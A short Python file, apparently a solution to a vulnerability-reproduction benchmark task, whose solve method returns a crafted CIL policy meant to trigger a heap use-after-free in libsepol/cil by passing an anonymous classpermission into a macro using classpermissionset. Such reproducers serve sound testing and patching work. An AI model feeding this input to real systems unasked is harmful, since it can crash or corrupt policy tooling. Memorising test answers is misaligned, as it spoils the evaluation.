import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in libsepol/cil.
        The vulnerability is triggered when an anonymous classpermission is passed into a macro
        that uses a classpermissionset rule.
        """
        # CIL policy logic:
        # 1. Define a class 'c' with a permission 'p'.
        # 2. Define a macro 'm' that takes a 'classpermission' argument named 'arg'.
        # 3. Inside the macro, define a 'classpermissionset' using the argument 'arg'.
        # 4. Call the macro 'm', passing an anonymous classpermission '(c (p))' as the argument.
        #
        # When the AST is destroyed, the anonymous classpermission is freed. Due to the
        # vulnerability, the classpermissionset rule also attempts to free it (or reference it),
        # leading to a double free or use-after-free.
        
        poc_content = (
            "(class c (p))\n"
            "(macro m ((classpermission arg))\n"
            "    (classpermissionset arg (c (p)))\n"
            ")\n"
            "(call m ((c (p))))\n"
        )
        
        return poc_content.encode('utf-8')
